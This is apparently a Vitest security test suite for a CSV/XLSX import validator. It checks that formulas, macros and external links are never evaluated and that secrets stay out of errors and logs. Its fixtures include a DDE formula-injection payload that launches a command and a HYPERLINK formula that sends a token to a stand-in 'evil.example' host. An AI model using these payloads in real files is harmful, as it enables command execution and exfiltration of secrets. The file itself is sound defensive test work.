/** @vitest-environment node */

import { afterEach, describe, expect, it, vi } from "vitest";

import {
  TabularValidationError,
  validateTabularImport,
} from "@/lib/orgs/tabular-validation";
import {
  CSV_MIME,
  XLSX_MIME,
  csvBytes,
  makeXlsx,
  sampleCsv,
} from "@/tests/helpers/tabular-fixtures";

const SECRET = "SECRET_TOKEN_VALUE_42";
const EVIL_URL = "https://evil.example/steal?token=SECRET_TOKEN_VALUE_42";

afterEach(() => {
  vi.restoreAllMocks();
});

describe("tabular validation security", () => {
  it("never evaluates formulas, macros, or external links", async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);

    await expect(
      validateTabularImport({
        bytes: await makeXlsx({
          sheets: [{ name: "Sheet1", rows: [["Name"], ["A"]] }],
          macroEnabled: true,
        }),
        filename: "macro.xlsx",
        declaredMimeType: XLSX_MIME,
      }),
    ).rejects.toMatchObject({ code: "macros" });

    const formulaCsv = await validateTabularImport({
      bytes: csvBytes(`Name,Payload\nWidget,=cmd|' /C calc'!A0\n`),
      filename: "inject.csv",
      declaredMimeType: CSV_MIME,
    });
    expect(formulaCsv.outcome).toBe("needs_attention");
    expect(formulaCsv.previewRows[0]?.cells[1]).toBe("=cmd|' /C calc'!A0");
    expect(formulaCsv.issues.some((item) => item.code === "formula_like")).toBe(
      true,
    );
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("flags complete formula-injection prefixes without leaking values", async () => {
    const csv = await validateTabularImport({
      bytes: csvBytes(`Name,Payload\nWidget,+1+1\nGadget,-2+3\n`),
      filename: "prefix.csv",
      declaredMimeType: CSV_MIME,
    });
    expect(csv.outcome).toBe("needs_attention");
    expect(csv.previewRows.map((row) => row.cells[1])).toEqual([
      "+1+1",
      "-2+3",
    ]);
    expect(csv.issues.every((item) => item.code === "formula_like")).toBe(true);
    expect(JSON.stringify(csv.issues)).not.toContain("+1+1");
    expect(JSON.stringify(csv.issues)).not.toContain("-2+3");
    expect(JSON.stringify(csv.issues)).not.toContain(SECRET);

    const xlsx = await validateTabularImport({
      bytes: await makeXlsx({
        sheets: [
          {
            name: "Sheet1",
            rows: [
              ["Name", "Payload"],
              ["Widget", "+1+1"],
              ["Gadget", "-2+3"],
              ["Tabbed", `\t${SECRET}`],
            ],
          },
        ],
      }),
      filename: "prefix.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(xlsx.outcome).toBe("needs_attention");
    expect(xlsx.previewRows[2]?.cells[1]).toBe(SECRET);
    expect(JSON.stringify(xlsx.issues)).not.toContain(SECRET);
    expect(JSON.stringify(xlsx.issues)).not.toContain("+1+1");
    expect(xlsx.issues.some((item) => item.code === "formula_like")).toBe(true);
  });

  it("does not treat commented OOXML markup as workbook data", async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    const result = await validateTabularImport({
      bytes: await makeXlsx({
        sheets: [{ name: "Sheet1", rows: [["Name"], ["Widget"]] }],
        extras: {
          "xl/worksheets/sheet1.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>
    <row r="2"><c r="A2" t="inlineStr"><is><t>Widget</t></is></c></row>
    <!-- <c r="A2" t="inlineStr"><is><t>${SECRET}</t></is></c> -->
    <!-- <hyperlink ref="A2" r:id="rId9"/> -->
    <!-- <c r="B2"><f>HYPERLINK("${EVIL_URL}","1")</f></c> -->
  </sheetData>
  <!-- <mergeCell ref="A1:Z1"/> -->
</worksheet>`,
        },
      }),
      filename: "comment-inject.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(result.outcome).toBe("ready");
    expect(result.previewRows[0]?.cells).toEqual(["Widget"]);
    expect(JSON.stringify(result.issues)).not.toContain(SECRET);
    expect(JSON.stringify(result.issues)).not.toContain(EVIL_URL);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("does not treat CDATA or processing-instruction OOXML payloads as workbook data", async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    const result = await validateTabularImport({
      bytes: await makeXlsx({
        sheets: [{ name: "Sheet1", rows: [["Name"], ["Widget"]] }],
        extras: {
          "xl/workbook.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <![CDATA[<sheet name="${SECRET}" sheetId="99" r:id="rId99"/>]]>
    <?pi <sheet name="Pi${SECRET}" sheetId="98" r:id="rId98"/> ?>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>`,
          "xl/_rels/workbook.xml.rels": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <![CDATA[<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="${EVIL_URL}"/>]]>
  <?pi <Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/evil-pi.xml"/> ?>
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>`,
          "xl/sharedStrings.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2" uniqueCount="2">
  <si><t>Name</t></si>
  <![CDATA[<si><t>${SECRET}</t></si>]]>
  <?pi <si><t>${EVIL_URL}</t></si> ?>
  <si><t>Widget</t></si>
</sst>`,
          "xl/worksheets/sheet1.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1"><c r="A1" t="s"><v>0</v></c></row>
    <![CDATA[<c r="A2" t="inlineStr"><is><t>${SECRET}</t></is></c>]]>
    <?pi <c r="B2"><f>HYPERLINK("${EVIL_URL}","1")</f><v>1</v></c> ?>
    <row r="2"><c r="A2" t="s"><v>1</v></c></row>
  </sheetData>
  <![CDATA[<hyperlink ref="A2" r:id="rId9"/>]]>
  <?pi <mergeCell ref="A1:Z1"/> ?>
</worksheet>`,
        },
      }),
      filename: "cdata-pi-inject.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(result.outcome).toBe("ready");
    expect(result.sheets.map((sheet) => sheet.name)).toEqual(["Sheet1"]);
    expect(result.previewRows[0]?.cells).toEqual(["Widget"]);
    expect(JSON.stringify(result.issues)).not.toContain(SECRET);
    expect(JSON.stringify(result.issues)).not.toContain(EVIL_URL);
    expect(JSON.stringify(result.sheets)).not.toContain(SECRET);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("keeps safe errors and logs free of file bytes, formulas, URLs, and secrets", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => undefined);
    const info = vi.spyOn(console, "info").mockImplementation(() => undefined);
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const error = vi
      .spyOn(console, "error")
      .mockImplementation(() => undefined);

    const csv = await validateTabularImport({
      bytes: csvBytes(`Name,Secret\nCustomer,${SECRET}\n=1+1,${EVIL_URL}\n`),
      filename: "secrets.csv",
      declaredMimeType: CSV_MIME,
    });
    expect(csv.issues.every((item) => !("message" in item))).toBe(true);
    expect(JSON.stringify(csv.issues)).not.toContain(SECRET);
    expect(JSON.stringify(csv.issues)).not.toContain(EVIL_URL);
    expect(JSON.stringify(csv.issues)).not.toContain("=1+1");

    try {
      await validateTabularImport({
        bytes: csvBytes(`Name\n"${SECRET}`),
        filename: "broken-secret.csv",
        declaredMimeType: CSV_MIME,
      });
    } catch (caught) {
      expect(caught).toBeInstanceOf(TabularValidationError);
      expect((caught as Error).message).not.toContain(SECRET);
      expect(String(caught)).not.toContain(SECRET);
    }

    const xlsx = await validateTabularImport({
      bytes: await makeXlsx({
        sheets: [
          {
            name: "Sheet1",
            rows: [
              ["Name", "Link"],
              ["Widget", SECRET],
            ],
            formulas: [
              {
                row: 2,
                column: 2,
                formula: `HYPERLINK("${EVIL_URL}","${SECRET}")`,
                cached: SECRET,
              },
            ],
            hyperlinks: [{ ref: "B2", url: EVIL_URL }],
          },
        ],
      }),
      filename: "secrets.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(JSON.stringify(xlsx.issues)).not.toContain(SECRET);
    expect(JSON.stringify(xlsx.issues)).not.toContain("HYPERLINK");
    expect(JSON.stringify(xlsx.issues)).not.toContain(EVIL_URL);
    expect(xlsx.previewRows[0]?.cells[1]).toBe(SECRET);

    for (const spy of [log, info, warn, error]) {
      expect(spy.mock.calls.flat().map(String).join("\n")).not.toContain(
        SECRET,
      );
      expect(spy.mock.calls.flat().map(String).join("\n")).not.toContain(
        EVIL_URL,
      );
    }
  });

  it("does not leak sensitive CSV content when a valid file parses", async () => {
    const result = await validateTabularImport({
      bytes: csvBytes(sampleCsv()),
      filename: "ok.csv",
      declaredMimeType: CSV_MIME,
    });
    expect(result.issues).toEqual([]);
    expect(JSON.stringify(result.issues)).not.toContain("Widget");
  });
});
